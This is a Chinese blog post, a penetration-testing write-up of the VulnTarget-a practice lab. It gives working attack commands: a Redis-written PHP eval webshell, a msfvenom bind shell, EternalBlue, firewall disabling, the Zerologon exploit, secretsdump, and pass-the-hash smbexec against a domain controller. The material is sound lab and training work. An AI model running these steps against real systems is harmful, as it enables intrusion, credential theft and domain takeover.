class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds</span><br><span class="line">           Raw packets sent: 6 (248B) | Rcvd: 4 (160B)</span><br></pre></td></tr></table></figure>
+
+<p>扫出存在ms17-010，且80端口开启了http服务</p>
+<h2 id="三、通达OA-Getshell"><a href="#三、通达OA-Getshell" class="headerlink" title="三、通达OA-Getshell"></a>三、通达OA-Getshell</h2><p>访问80端口，是一个通达OA系统</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180349959-1667979959.png" alt="image-20220224180348215"></p>
+<p>直接上通达OA综合利用工具</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180450264-1792432834.png" alt="image-20220224180450014"></p>
+<p>上传webshell，后使用蚁剑相连</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224190238933-863110053.png" alt="image-20220224190238677"></p>
+<h2 id="四、ms17-010"><a href="#四、ms17-010" class="headerlink" title="四、ms17-010"></a>四、ms17-010</h2><p>使用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue，设置好ip</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110354482-370777190.png" alt="image-20220225110354133"></p>
+<p>获取密码</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110621623-777957063.png" alt="image-20220225110622088"></p>
+<p>发现内网网段</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110725843-1000787767.png" alt="image-20220225110726376"></p>
+<p>进程迁移 run post&#x2F;windows&#x2F;manage&#x2F;migrate </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111356795-1313355061.png" alt="image-20220225111357560"></p>
+<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111701747-1624666354.png" alt="image-20220225111702604"></p>
+<p>扫描另一个网段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set ports 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">ports =&gt; 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 10.0.20.0/24</span><br><span class="line">rhosts =&gt; 10.0.20.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225112650421-901340987.png" alt="image-20220225112650988"></p>
+<p>设置代理 use auxiliary&#x2F;server&#x2F;socks_proxy</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225114131297-1320655720.png" alt="image-20220225114131843"></p>
+<p>扫描目录发现phpinfo.php，访问得到网站的绝对路径 C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132259717-246697551.png" alt="image-20220225132300461"></p>
+<h2 id="五、Redis未授权"><a href="#五、Redis未授权" class="headerlink" title="五、Redis未授权"></a>五、Redis未授权</h2><p>根据前面端口扫描的结果，发现10.0.20.99开放6379端口，为redis服务，连接redis服务端</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132358885-169890561.png" alt="image-20220225132359703"></p>
+<p>前面知道了web的绝对路径，就可以尝试写webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set 1 &quot;&lt;?php @eval($_POST[&#x27;xt&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132545506-441461470.png" alt="image-20220225132546411"></p>
+<p>成功写入</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132627451-134243051.png" alt="image-20220225132628431"></p>
+<p>配置蚁剑的代理</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132918058-500776476.png" alt="image-20220225132918931"></p>
+<p>连接webshell</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132954621-1024961877.png" alt="image-20220225132955428"></p>
+<p>发现另一个内网IP10.0.10.111</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225133312093-1879231647.png" alt="image-20220225133311482"></p>
+<p>上线msf </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8090 -f exe &gt; bind_8090.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225141445075-1184723408.png" alt="image-20220225141444539"></p>
+<p>通过蚂剑上传exe</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145547529-1362028343.png" alt="image-20220225145546791"></p>
+<p>msf设置监听</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145657518-2077326036.png" alt="image-20220225145656812"></p>
+<p>关闭防火墙</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145724406-1568966848.png" alt="image-20220225145724001"></p>
+<p>运行exe，可以看到上线msf成功</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145805889-782803992.png" alt="image-20220225145805449"></p>
+<p>加载kiwi，进行进程迁移</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145925039-1401644437.png" alt="image-20220225145924483"></p>
+<p>查看HTLM</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150027820-1217638930.png" alt="image-20220225150027261"></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150132856-1497488849.png" alt="image-20220225150132278"></p>
+<p>破解密码，得知win2016的密码为Admin@123</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150258857-904011230.png" alt="image-20220225150258263"></p>
+<p>查看域控制器计算机名</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150517118-936221546.png" alt="image-20220225150516700"></p>
+<p>查看域管理员</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150543950-1336172595.png" alt="image-20220225150543586"></p>
+<p>得到域控制器的IP为10.0.10.110</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150618111-137306728.png" alt="image-20220225150617712"></p>
+<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150721610-1227593958.png" alt="image-20220225150721108"></p>
+<h2 id="六、CVE-2020-1472提权"><a href="#六、CVE-2020-1472提权" class="headerlink" title="六、CVE-2020-1472提权"></a>六、CVE-2020-1472提权</h2><p>因为拿到的是域普通用户的权限，直接上1472</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152834006-1262917074.png" alt="image-20220225152833403"></p>
+<p>此时密码已置空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python secretsdump.py  vulntarget.com/WIN2019\$@10.0.10.110  -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152850109-4254443.png" alt="image-20220225152849412"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p>成功访问域控</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225153425556-447460473.png" alt="image-20220225153424916"></p>
+<p>破解hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/nmap/nselib/data/passwords.lst hash.txt --format=NT</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154241871-1129294273.png" alt="image-20220225154241357"></p>
+<p>开启远程桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154445468-1141645458.png" alt="image-20220225154444872"></p>
+<p>上线msf，先关闭防火墙策略</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;bind tcp&quot; protocol=TCP dir=in localport=8090 action=allow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155030667-1311091733.png" alt="image-20220225155030184"></p>
+<p>运行exe，上线成功</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155107644-2051212924.png" alt="image-20220225155107107"></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155139792-2008698039.png" alt="image-20220225155139347"></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>kpa1on
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://kpa1on.github.io/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="VulnTarget-a 靶场渗透测试">https://kpa1on.github.io/2022/03/11/VulnTarget-a 靶场渗透测试/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/vulntarget/" rel="tag"># vulntarget</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/15/Docker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" rel="next" title="Docker容器的简单使用">
+                  Docker容器的简单使用 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kpa1on</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">145k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:12</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共37.9k字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
